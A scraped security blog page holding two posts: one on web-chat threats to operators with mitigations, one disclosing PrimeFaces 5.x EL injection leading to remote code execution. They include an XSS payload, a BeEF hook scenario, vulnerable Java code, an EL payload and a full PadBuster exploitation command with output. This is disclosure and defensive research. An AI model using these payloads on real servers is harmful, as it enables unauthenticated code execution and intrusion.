* [Supply Chain Security](https://blog.mindedsecurity.com/search/label/Supply%20Chain%20Security)
  (
  1
  )
* [SVG](https://blog.mindedsecurity.com/search/label/SVG)
  (
  1
  )
* [Swift](https://blog.mindedsecurity.com/search/label/Swift)
  (
  1
  )
* [TARA](https://blog.mindedsecurity.com/search/label/TARA)
  (
  1
  )
* [Telerik UI](https://blog.mindedsecurity.com/search/label/Telerik%20UI)
  (
  1
  )
* [TESTABLE](https://blog.mindedsecurity.com/search/label/TESTABLE)
  (
  1
  )
* [testing](https://blog.mindedsecurity.com/search/label/testing)
  (
  1
  )
* [Threat Modeling](https://blog.mindedsecurity.com/search/label/Threat%20Modeling)
  (
  1
  )
* [twitter](https://blog.mindedsecurity.com/search/label/twitter)
  (
  1
  )
* [UNECE R155](https://blog.mindedsecurity.com/search/label/UNECE%20R155)
  (
  1
  )
* [unzip directory traversal](https://blog.mindedsecurity.com/search/label/unzip%20directory%20traversal)
  (
  1
  )
* [UPnP](https://blog.mindedsecurity.com/search/label/UPnP)
  (
  2
  )
* [validation](https://blog.mindedsecurity.com/search/label/validation)
  (
  1
  )
* [Vulnerabilities statistics](https://blog.mindedsecurity.com/search/label/Vulnerabilities%20statistics)
  (
  1
  )
* [WAF](https://blog.mindedsecurity.com/search/label/WAF)
  (
  1
  )
* [WAPT](https://blog.mindedsecurity.com/search/label/WAPT)
  (
  1
  )
* [Web Application Firewall](https://blog.mindedsecurity.com/search/label/Web%20Application%20Firewall)
  (
  1
  )
* [web architecture security](https://blog.mindedsecurity.com/search/label/web%20architecture%20security)
  (
  1
  )
* [Web Attacks](https://blog.mindedsecurity.com/search/label/Web%20Attacks)
  (
  23
  )
* [web cache](https://blog.mindedsecurity.com/search/label/web%20cache)
  (
  1
  )
* [web injection](https://blog.mindedsecurity.com/search/label/web%20injection)
  (
  4
  )
* [Web Security](https://blog.mindedsecurity.com/search/label/Web%20Security)
  (
  23
  )
* [Windows Phone Security](https://blog.mindedsecurity.com/search/label/Windows%20Phone%20Security)
  (
  1
  )
* [WWeb Security](https://blog.mindedsecurity.com/search/label/WWeb%20Security)
  (
  2
  )
* [zeus p2p](https://blog.mindedsecurity.com/search/label/zeus%20p2p)
  (
  3
  )

## Blog Archive

* [May](https://blog.mindedsecurity.com/2024/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2024/04/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2024/03/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2023/10/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2023/06/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2023/03/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2023/02/)
  (
  1
  )
* [July](https://blog.mindedsecurity.com/2022/07/)
  (
  1
  )
* [December](https://blog.mindedsecurity.com/2021/12/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2021/08/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2021/05/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2021/02/)
  (
  1
  )
* [January](https://blog.mindedsecurity.com/2021/01/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2020/11/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2020/10/)
  (
  1
  )
* [July](https://blog.mindedsecurity.com/2020/07/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2020/06/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2020/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2020/04/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2020/03/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2020/02/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2019/04/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2018/10/)
  (
  3
  )
* [September](https://blog.mindedsecurity.com/2018/09/)
  (
  3
  )
* [July](https://blog.mindedsecurity.com/2018/07/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2018/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2018/04/)
  (
  2
  )
* [November](https://blog.mindedsecurity.com/2017/11/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2017/06/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2016/02/)
  (
  2
  )
* [January](https://blog.mindedsecurity.com/2016/01/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2015/11/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2015/10/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2015/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2015/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2015/06/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2015/04/)
  (
  2
  )
* [March](https://blog.mindedsecurity.com/2015/03/)
  (
  4
  )
* [February](https://blog.mindedsecurity.com/2015/02/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2014/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2014/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2014/06/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2013/10/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2013/04/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2013/02/)
  (
  2
  )
* [November](https://blog.mindedsecurity.com/2012/11/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2012/10/)
  (
  3
  )
* [September](https://blog.mindedsecurity.com/2012/09/)
  (
  4
  )
* [June](https://blog.mindedsecurity.com/2012/06/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2011/10/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2011/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2011/08/)
  (
  2
  )
* [July](https://blog.mindedsecurity.com/2011/07/)
  (
  2
  )
* [May](https://blog.mindedsecurity.com/2011/05/)
  (
  2
  )
* [April](https://blog.mindedsecurity.com/2011/04/)
  (
  2
  )
* [March](https://blog.mindedsecurity.com/2011/03/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2010/10/)
  (
  8
  )
* [September](https://blog.mindedsecurity.com/2010/09/)
  (
  3
  )
* [August](https://blog.mindedsecurity.com/2010/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2010/06/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2010/04/)
  (
  4
  )
* [March](https://blog.mindedsecurity.com/2010/03/)
  (
  1
  )
* [December](https://blog.mindedsecurity.com/2009/12/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2009/11/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2009/10/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2009/05/)
  (
  4
  )
* [February](https://blog.mindedsecurity.com/2009/02/)
  (
  2
  )
* [January](https://blog.mindedsecurity.com/2009/01/)
  (
  1
  )

####

Minded Security was established in Italy in 2007

with a focus on supporting businesses and

organizations to build secure products
 and services.

##### Services

* Training
* Testing
* Consulting
* Request a brochure

##### Information

* The Company
* blueclosure
* AMT – Banking Malware Detector
* Contact us
* Privacy Policy

##### Newsletter

©2015 Minded Security S.r.l. The Software Security Company - VAT IT05756380480

[Back to top](#top)



=== Content from blog.mindedsecurity.com_c96b6112_20250126_020846.html ===


[Subscribe our newsletter](https://mindedsecurity.com/newsletter)

[Minded Security](https://mindedsecurity.com)

* Industry
  + [Automotive/Maritime](https://mindedsecurity.com/industry/automotive-maritime/ "Automotive/Maritime")
  + [Financial](https://mindedsecurity.com/industry/financial/ "Financial")
  + [GDO](https://mindedsecurity.com/industry/gdo/ "GDO")
  + [Industrial Control Systems](https://mindedsecurity.com/industry/industrial-control-systems/ "Industrial Control Systems")
  + [IoT Security](https://mindedsecurity.com/industry/iot-security/ "IoT Security")
  + [Healthcare](https://mindedsecurity.com/industry/healthcare/ "Healthcare")
  + [Government](https://mindedsecurity.com/industry/government/ "Government")
* [Services](https://mindedsecurity.com/our-services/ "Services")
  + [Training](https://mindedsecurity.com/our-services/training/ "Training")
    - [Security Hackaton](https://mindedsecurity.com/services/training/security-hackaton/ "Security Hackaton")
    - [Advanced On-site Training](https://mindedsecurity.com/services/training/advanced-on-site-training/ "Advanced On-site Training")
    - [BlueClosure Training](https://mindedsecurity.com/services/training/blueclosure-training/ "BlueClosure Training")
    - [High Level Training](https://mindedsecurity.com/services/training/high-level-training/ "High Level Training")
    - [Webinar](https://mindedsecurity.com/services/training/webinar/ "Webinar")
  + [Testing](https://mindedsecurity.com/our-services/testing/ "Testing")
    - [Manual Secure Code Review](https://mindedsecurity.com/services/testing/manual-secure-code-review/ "Manual Secure Code Review")
    - [Manual WAPT](https://mindedsecurity.com/services/testing/manual-wapt/ "Manual WAPT")
    - [Cloud Security Testing](https://mindedsecurity.com/services/testing/cloud-security-testing/ "Cloud Security Testing")
    - [IoT Security](https://mindedsecurity.com/services/testing/iot-security/ "IoT Security")
    - [API Security](https://mindedsecurity.com/services/testing/api-security/ "API Security")
    - [Mobile Security Assessment](https://mindedsecurity.com/services/testing/mobile-security-assessment/ "Mobile Security Assessment")
    - [Client Side Assessment](https://mindedsecurity.com/services/testing/client-side-assessment/ "Client Side Assessment")
  + [Consulting](https://mindedsecurity.com/our-services/consulting/ "Consulting")
    - [Software Security Advisory](https://mindedsecurity.com/services/consulting/software-security-advisory/ "Software Security Advisory")
    - [5D Framework](https://mindedsecurity.com/services/consulting/5d-framework/ "5D Framework")
    - [Threat Modeling](https://mindedsecurity.com/services/consulting/threat-modeling/ "Threat Modeling")
    - [Secure Design](https://mindedsecurity.com/services/consulting/secure-design/ "Secure Design")
    - [Secure Architecture Review](https://mindedsecurity.com/services/consulting/secure-architecture-review/ "Secure Architecture Review")
    - [Secure Coding Guidelines](https://mindedsecurity.com/services/consulting/secure-coding-guidelines/ "Secure Coding Guidelines")
    - [Fixing Support](https://mindedsecurity.com/services/consulting/fixing-support/ "Fixing Support")
    - [Outsourcing Development Governance](https://mindedsecurity.com/services/consulting/outsourcing-development-governance/ "Outsourcing Development Governance")
  + [Request a brochure](https://mindedsecurity.com/request-a-brochure/ "Request a brochure")
* Resources
  + [Blog](https://blog.mindedsecurity.com/ "Blog")
  + [News](https://mindedsecurity.com/category/news/ "News")
  + [Videos](https://mindedsecurity.com/videos/ "Videos")
  + [Research](https://mindedsecurity.com/research/ "Research")
  + [Advisories](https://mindedsecurity.com/research/advisories/ "Advisories")
* [About us](https://mindedsecurity.com/our-mission/ "About us")
  + [The Company](https://mindedsecurity.com/the-company/ "The Company")
  + [Contact us](https://mindedsecurity.com/contact-us/ "Contact us")
  + [Newsletter](https://mindedsecurity.com/newsletter/ "Newsletter")
  + [Jobs](https://mindedsecurity.com/jobs/ "Jobs")
  + [Privacy Policy](https://mindedsecurity.com/privacy-policy/ "Privacy Policy")

## IMQ Minded Security Blog

[skip to main](#main)  |
[skip to sidebar](#sidebar)

Showing posts with label **Remote Code Execution**. [Show all posts](https://blog.mindedsecurity.com/)

Showing posts with label **Remote Code Execution**. [Show all posts](https://blog.mindedsecurity.com/)

## Monday, May 18, 2020

# [Remote Working - Web Chats: Threats and countermeasures](https://blog.mindedsecurity.com/2020/05/remote-working-web-chats-threats-and.html)

### Introduction

With recent worldwide events, a sharply increasing number of companies are offering remote services to their customers. Even traditional businesses are implementing new features or pushing the migration of existing features to new needs of dematerialization of human-to-human relationships.

Web chats are an example of such trends.

### Web chats

Rich messages web chats are a common feature implemented by companies to overcome the need of social distancing, while maintaining a close relationship with customers.

An example of rich messages web chat would be a graphical widget loaded by web site visitors to establish a chat session with a human operator, with the objective of sharing documents in a multimedia environment: users can share PDF files (e.g. personal documents, scans), video or audio files (e.g. vocal record of a formal declaration, acceptance of conditions and clauses for contracts, identity recognition) or even unpredicted formats, to deal with the abundance of multimedia files offered by end-user environments.

To do so, preview feature has a crucial role.
#### Scenario

As shown below, a typical scenario is a web server exposing chat capabilities, allowing human operators in a trusted network (e.g. a LAN) to interact with remote customers.
Usually, customers interact with the chat using a common browser over an untrusted network (the Internet, their own device); chat operators interact with customers using a browser or the backoffice component of the web chat, which commonly offers rich features, such as document viewing, session management, multiple channels interaction and capabilities to interact with customers in an "enhanced" manner.

This article will describe several attack vectors from potentially malicious remote customers against targeted chat operators and the software they use to interact with customers: the objective of described workflows is attacking the trusted internal corporate network.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj3cXr-4yFOoNKG7uDkzur7Xvx1cjBqRznirKuNRssKVdF9ELVB8Vbm6kxhAmJSTfZy6r1Y1jaWvU6XpNwOgDDPsdt-2559ly-3XgSqcpDGjpNqQjZ7fTIc6P-qG5KTIC7GoHVfKm4BOWs2/s1600/Diagram1.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj3cXr-4yFOoNKG7uDkzur7Xvx1cjBqRznirKuNRssKVdF9ELVB8Vbm6kxhAmJSTfZy6r1Y1jaWvU6XpNwOgDDPsdt-2559ly-3XgSqcpDGjpNqQjZ7fTIc6P-qG5KTIC7GoHVfKm4BOWs2/s1600/Diagram1.png)

#### Rich data exchange interaction

Backoffice chat components trie to recognize messages, files and URLs submitted by chat users with the aim of previewing them or offering operators with advanced tools to manipulate data.
Different recognition approaches are usually in place: parse file extensions, MIME type of uploaded files, and actually reading the real content of the file prior to supplying it to the operator.
If the recognition procedure does not thoroughly include a secure implementation of all the mentioned approaches, chat operators and internal resources may be prone to security threats.

### Threats

Web chats can accept several formats for files, sent by users (e.g. with drag & drop) or submitting URLs.

#### HTML payloads

The simplest and most known attack vector is abusing the HTML parser of web chats:

Customer enters <b>ciao!</b>
Operator sees **ciao!**

Customer enters <script>alert("XSS!")</script>
Operator sees:
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi7mPA450e6Ih0VbpFF-3yBQPawR8MSIP2oxWXSEDcXH9BV_DV4MfWcN1vYdGMgABlK0hYsLGtDJheoBbsng-G4EHOZzW4hlvzNDLrBisykXxlEcNJolH6QaUYygFPVoRsdUF1ol5VNrfKr/s640/xss.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi7mPA450e6Ih0VbpFF-3yBQPawR8MSIP2oxWXSEDcXH9BV_DV4MfWcN1vYdGMgABlK0hYsLGtDJheoBbsng-G4EHOZzW4hlvzNDLrBisykXxlEcNJolH6QaUYygFPVoRsdUF1ol5VNrfKr/s1600/xss.png)

#### Malformed PDF file upload

User supplied PDF files can be opened by chat operators in embedded viewers in the backoffice component of the web chat or downloaded on their workstation, within the trusted corporate network.
Such files can be vehicle of arbitrary code (e.g. JavaScript or other active code), which can therefore be executed on the endpoint of chat operators, exploiting known vulnerabilities in the browser or in any other software used by operators to view the file.

As an example, PDF files can contain dynamic JavaScript code, very similar to how XSS attacks work:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgmtuZVLfA14OSmh2BqrPfOjtG8JpCZCPdSrGJK6fZQOBvY1pNzABQUPVJjPOsfjvqS0fI8VmmjaCZOSlFdPSQZotzR2W80wWoQJyK6w3vQlv_mh4KSfc3dld5MOrYuVHhwZ0ysxr_ynEF/s640/pdf_dynamic.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgmtuZVLfA14OSmh2BqrPfOjtG8JpCZCPdSrGJK6fZQOBvY1pNzABQUPVJjPOsfjvqS0fI8VmmjaCZOSlFdPSQZotzR2W80wWoQJyK6w3vQlv_mh4KSfc3dld5MOrYuVHhwZ0ysxr_ynEF/s1600/pdf_dynamic.png)

Thus, malformed PDFs, especially if loaded with an outdated Adobe Acrobat version, can be an attack vector for further exploits (e.g. meterpreter payloads, malwares, droppers..) against the internal network, the browser, the operating system or other components in the trusted backoffice environment.

Note: any security concern for PDF files should be extended to Office documents (Word, Excel, Powerpoint), especially if older and/or not hardened versions of Microsoft Office are in use.
For example threats may include malwares embedded in Office documents or CSV Formula Injection attacks.

#### Malicious URLs (Abusing preview feature)

Web chats tries to parse URLs pasted by users' messages, with the aim of previewing their content.
If the parsing procedure is executed correctly, the PDF is previewed by an embedded viewer, and it can therefore lead to scenarios described above.
On the contrary, if the parsing procedure is not correctly executed, the preview mechanism (triggered by the presence of ".PDF" string in the URL) can lead to unexpected events.

For example, if the URL ends with ".pdf" string, the web chat may attempt to dynamically load *any* preview module. As shown below, ".pdf" in the URL does not indicate a real PDF file, but a folder named ".pdf" on an arbitrary web server.

Content of the attacker's web site:

$ ls ./.pdf -1
minded (executable file)
minded.html (malicious HTML file)
minded.pdf (malicious PDF file)
$

Behaviour of the preview on chat operator's software:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiOY1JdERJoEVExDtiaQAYbthq2M8Kvm16HBMhdqQdXSybzmBZ1v02pwD1H7Rygv0-L85K8XJnwmQzY3h-j8ICeDAtOVVudgYIzeg6RMlL0jmzwycKO0NrGwVUZqRryJr56rQej_CM4_zGi/s640/directory_listing1.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiOY1JdERJoEVExDtiaQAYbthq2M8Kvm16HBMhdqQdXSybzmBZ1v02pwD1H7Rygv0-L85K8XJnwmQzY3h-j8ICeDAtOVVudgYIzeg6RMlL0jmzwycKO0NrGwVUZqRryJr56rQej_CM4_zGi/s1600/directory_listing1.png)

Several social engineering scenarios can be constructed over this behaviour, for example convincing the chat operator (whose job is trying to efficently interact with a customer) to download other files.

Semi-automatic scenarios, on the other hand, can include the execution of arbitrary code in HTML files, abusing the preview feature. For example, it would be possible to spawn a BeEF HTML hook against the browser in use by the chat operator:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhp8VDVtUw_BVcqfwqqU038-gSrubBe9tTIzu40oh7ZX3BBsDI0dtV9-nTEe_qoUZhRUFv12CxSYtNszEIVXfqL08OeXoCGU5P2phjpHAQC49NZMLAX5AEgesnEl3WIo5k9vWeL-bZowhou/s640/pdf_active_BEEF1.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhp8VDVtUw_BVcqfwqqU038-gSrubBe9tTIzu40oh7ZX3BBsDI0dtV9-nTEe_qoUZhRUFv12CxSYtNszEIVXfqL08OeXoCGU5P2phjpHAQC49NZMLAX5AEgesnEl3WIo5k9vWeL-bZowhou/s1600/pdf_active_BEEF1.png)

The command & control server (used by the attacker / evil customer) would look similar to the following:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRrxn9se6Ph9khh_JOiXg0tzUpMNglTZ0QoZgpM10kZGvvJLn-0rgOEXc6HHVLTUJO7OjaoHOGlJHEz5HoJgImiu7UHdw8VOGe_IkZhsv8mCeN96bjn9Swgx6eiyTq7TSddACXPZ_i0jOS/s1600/pdf_active_beef2.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRrxn9se6Ph9khh_JOiXg0tzUpMNglTZ0QoZgpM10kZGvvJLn-0rgOEXc6HHVLTUJO7OjaoHOGlJHEz5HoJgImiu7UHdw8VOGe_IkZhsv8mCeN96bjn9Swgx6eiyTq7TSddACXPZ_i0jOS/s1600/pdf_active_beef2.png)

Consequently, the attacker can use a large plethora of social engineering / hijacking techniques.

For example, spawning fake system messages / Java Applet load requests:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEid4D5AH6Udstu2qbmorw3WyRNOyMZmxuWAbXNY5XCQQzB03Qzs2obt0P6jxxhog2zrmL5sXpbiPHKSEnbaL9TQr3Omj2V1xMqLN3_HZ4Q7pk7FqgglZ-3j8Ilfm1fQ_6xJHBZfh7u_R1Qm/s640/arbitrary_content3.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEid4D5AH6Udstu2qbmorw3WyRNOyMZmxuWAbXNY5XCQQzB03Qzs2obt0P6jxxhog2zrmL5sXpbiPHKSEnbaL9TQr3Omj2V1xMqLN3_HZ4Q7pk7FqgglZ-3j8Ilfm1fQ_6xJHBZfh7u_R1Qm/s1600/arbitrary_content3.png)

Or even spawning fake Clippy Office Assistants:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjwg8qOW3FSeGV-Eno-9QQJVkFGukQnspZTYROC7l6h8aJqbUVOQ3l1pqaRlIe3kz89qrJwEwLuQA_px3OLqOgMBCDdQITjGtLesNigkldRl_HQQDCrHRH-LJrxBqO3Ldi-k8xLHeMS3PuD/s640/arbitrary_content.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjwg8qOW3FSeGV-Eno-9QQJVkFGukQnspZTYROC7l6h8aJqbUVOQ3l1pqaRlIe3kz89qrJwEwLuQA_px3OLqOgMBCDdQITjGtLesNigkldRl_HQQDCrHRH-LJrxBqO3Ldi-k8xLHeMS3PuD/s1600/arbitrary_content.png)

#### Embedded players

Web chats may also include MP3 players, which, depending on the library in use by the chat software, may be prone to vulnerabilities related to outdated software modules.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiuRymM6eJk66tic92-NT9XtuNa2CW49-HgRRWMlJwMosVE2x1B8NrlCIy0DmNgWJN6HlbJvZE7_KTJR0okrSDLLlrezKPnr-rUhkxDEWXZCqvGOGnSL4tF8MmgP3vxqgV-TO8C1SUu63Yb/s1600/mp3.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiuRymM6eJk66tic92-NT9XtuNa2CW49-HgRRWMlJwMosVE2x1B8NrlCIy0DmNgWJN6HlbJvZE7_KTJR0okrSDLLlrezKPnr-rUhkxDEWXZCqvGOGnSL4tF8MmgP3vxqgV-TO8C1SUu63Yb/s1600/mp3.png)

### Mitigations

* Validate any uploaded file according to a predefined list of expected file types:

> - Extension
> - Content Type
> - Actual content of the file

* Rescale / Resize with a 1:1 ratio any multimedia file, before allowing chat operators to open the file, in the attempt of removing any metadata
* Properly hardening procedures should be applied to any software in use by chat operators:

> - Update PDF viewer software to the latest available version
> - Apply proper security options (e.g. Enhanced security and protected mode in Adobe Acrobat) to harden PDF viewer software

* Define a list of allowed file types for the preview feature, avoiding any other format: if chat operators are expected to receive only URLs, documents and images, define a list where only PDFs and JPGs/PNGs are allowed, while any other extension is *excluded* from previewing components.

### References

https://acrobatusers.com/assets/collections/tutorials/legacy/tech\_corners/javascript\_corner/tips/2006/popup\_windows\_part2/AlertBoxExamples.pdf
https://www.adobe.com/devnet-docs/acrobatetk/tools/AppSec/enhanced.html
https://owasp.org/www-community/attacks/CSV\_Injection
https://beefproject.com/

By

[Fabrizio Bugli](https://www.blogger.com/profile/02917760476807817801 "author profile")

at

[2:59 AM](https://blog.mindedsecurity.com/2020/05/remote-working-web-chats-threats-and.html "permanent link")

[No comments
:](https://blog.mindedsecurity.com/2020/05/remote-working-web-chats-threats-and.html#comment-form)

[![](//img2.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7122745763234660283&postID=2672280608940115729&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=2672280608940115729&target=email "Email This")
[BlogThis!](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=2672280608940115729&target=blog "BlogThis!")
[Share to X](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=2672280608940115729&target=twitter "Share to X")
[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=2672280608940115729&target=facebook "Share to Facebook")
[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=2672280608940115729&target=pinterest "Share to Pinterest")

Labels:
[chat](https://blog.mindedsecurity.com/search/label/chat)
,
[javascript](https://blog.mindedsecurity.com/search/label/javascript)
,
[Remote Code Execution](https://blog.mindedsecurity.com/search/label/Remote%20Code%20Execution)
,
[remote working](https://blog.mindedsecurity.com/search/label/remote%20working)

## Monday, February 15, 2016

# [RCE in Oracle NetBeans Opensource Plugins: PrimeFaces 5.x Expression Language Injection](https://blog.mindedsecurity.com/2016/02/rce-in-oracle-netbeans-opensource.html)

PrimeFaces is a [open source](https://en.wikipedia.org/wiki/Open_source "Open source") [User Interface](https://en.wikipedia.org/wiki/User_Interface "User Interface") (UI) component library for [JavaServer Faces](https://en.wikipedia.org/wiki/JavaServer_Faces "JavaServer Faces") (JSF) based applications, since its release, PrimeFaces has been strongly supported by Oracle, particularly within the [NetBeans](https://en.wikipedia.org/wiki/NetBeans "NetBeans") world.

### Disclosure Timeline

PrimeFaces team has been contacted on 20/06/2015 (7 months ago) providing  the following details. Unfortunately the vulnerability has still not been fixed.

PrimeFaces team was asking us to send a *github* pull request to the public PrimeFaces *github* dev group; since public pull requests can be read by anyone, we thought that we could link this public content to inform both developers and final users.

### PrimeOracle and PrimeSecret Vulnerability Detail

The following two issues have been successfully exploited against PrimeFaces 5.x and 5.3.x, including but not limited to PrimeFaces 5.3.6 version.

The following video shows the impact of these vulnerabilities against a vulnerable ***Oracle Netbeans 8.0.2*** setup with ***PrimeFaces*** plugin:

Security issues are cryptographic vulnerabilities that let unauthenticated users to inject arbitrary Expression Language code to PrimeFaces custom EL parser. Both issues have the same sink: *EL expression evaluation*.

In this post we shared a [generic payload to execute a remote interactive command shell via EL](http://blog.mindedsecurity.com/2011/09/expression-language-injection.html) .

These two Crypto issues have been called "*PrimeSecret*" and "*PrimeOracle*".

Eventually by abusing one of these issues any user can execute arbitrary code on the application server without authentication.

1) *PrimeSecret* is the default hard-coded passphrase to encrypt several PrimeFaces parameters such as "pfdrid" (by Stefano Di Paola).

2) *PrimeOracle* is the abuse of a [Padding Oracle](https://en.wikipedia.org/wiki/Padding_oracle_attack) [attack](http://usenix.org/legacy/events/woot10/tech/full_papers/Rizzo.pdf) against the internal crypto algorithm that decrypts several parameters such as *"pfdrid"* (by Giorgio Fedon).

The common vulnerable [sink](https://en.wikipedia.org/wiki/Sink_%28computing%29) for both security issues is the PrimeFaces Streamed Content Handler that executes EL inline:

/org/primefaces/application/resource/StreamedContentHandler.java

`..

String dynamicContentId = (String)

params.get(Constants.DYNAMIC_CONTENT_PARAM);

...

String dynamicContentEL = strEn.decrypt(dynamicContentId);

...

ValueExpression ve =

context.getApplication().getExpressionFactory().createValueExpression(context.getELContext(),

dynamicContentEL, StreametreamedContent.class);

streamedContent = (StreamedContent) ve.getValue(eLContext);`

In 2011 a user already
reported to the dev team the dangerous impacts of EL injection:

* <http://forum.primefaces.org/viewtopic.php?f=3&t=10899>

*StreamlinedContent* is not a new sink to PrimeFaces dev community
as clearly stated in that old post. However at that time the issue was much easier to be exploited.

In short we bypassed a partial security fix available in the newer versions of *Primefaces* to abuse a known vulnerability.

#### PrimeSecret

Vulnerable Code that leads to PrimeSecret:

file: "/org/primefaces/config/ConfigContainer.java"

// By default encryption Key is the hardcoded string "primefaces"

`secretKey = (value == null) ? "primefaces" : value;`

#### PrimeOracle

Vulnerable Code that leads to PrimeOracle:

file: "/org/primefaces/util/StringEncrypter.java"

// 8-bytes Salt <- Static IV

`byte[] salt = {

(byte) 0xA9, (byte) 0x9B, (byte) 0xC8, (byte) 0x32,

(byte) 0x56, (byte) 0x34, (byte) 0xE3, (byte) 0x03

};

...`

// Padding Oracle vulnerability since the DES cipher is CBC based

// and process encrypted text without verification (e.g. // HMAC)

`KeySpec keySpec = new PBEKeySpec(passPhrase.toCharArray(),

salt, iterationCount);

SecretKey key =

SecretKeyFactory.getInstance("PBEWithMD5AndDES").generateSecret(keySpec);`

### Exploitation is easy with PadBuster

In the following example we are going to show the exploitation of  *PrimeOracle* issue. *PrimeOracle* exploit can be seen as a generic way to exploit both issues. With PrimeOracle is possible to obtain a resulting exploit parameter string that can be reused against all targets with the same password.

That resulting string obtained from a host vulnerable to Primesecret, will work against all the target with the default *secretKey* configuration parameter.

First of all for this exploit to work you need a tool to exploit Padding Oracle Vulnerabilities like the beautiful [PadBuster](https://github.com/GDSSecurity/PadBuster) tool from [GDS Security](https://www.gdssecurity.com/). Then you can choose any EL payload to be encrypt using the tool.

In this case the payload we have chosen is:

`// Set a response Header with a value of "primesecretchk" Request Parameter
${facesContext.getExternalContext().setResponseHeader("primesecretchk",request.getParameter("primesecretchk"))}`

Note: Any EL can be executed: payloads can range from reading user session parameters, to arbitrary code execution that can lead to OS compromise.

Then just launch Padbuster with the following command:

`./padBuster.pl

"http://localhost:8085/showcase-5.1/javax.faces.resource/dynamiccontent.properties.xhtml?pfdrt=sc&ln=primefaces&pfdrid=C24UkygWm3HMmnSxmDwoxw%3D%3D"

"C24UkygWm3HMmnSxmDwoxw%3D%3D" 8 -encoding 0 -plaintext

'${facesContext.getExternalContext().setResponseHeader("primesecretchk",request.getParameter("primesecretchk"))}'

+-------------------------------------------+

| PadBuster - v0.3.3                        |

| Brian Holyfield - Gotham Digital Science  |

| labs@gdssecurity.com                      |

+-------------------------------------------+

INFO: The original request returned the following

[+] Status: 500

[+] Location: N/A

[+] Content Length: 65766

INFO: Starting PadBuster Encrypt Mode

[+] Number of Blocks: 14

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------

ID#    Freq    Status    Length    Location

-------------------------------------------------------

1    1    500    65715    N/A

2 **    255    200    0    N/A

-------------------------------------------------------

Enter an ID that matches the error condition

NOTE: The ID# marked with ** is recommended :2

-------------------------------------------------------

** Finished ***

[+] Encrypted value is:

wQR45Hj4OwBRgKBtl5v%2FG4elO1lYWl%2BZfvjy1R79FgJ%2F3H%2BKYopezNVswr9KFx%2B8XaKwW6Tq3bG8OxNcX3CjCO5%2F1SsvFbW8gn6BL38vAt03Pz2scc3fGrGm3Vi7A7wdmqDjIu5mWyXWVXipcGirQgAAAAAAAAAA

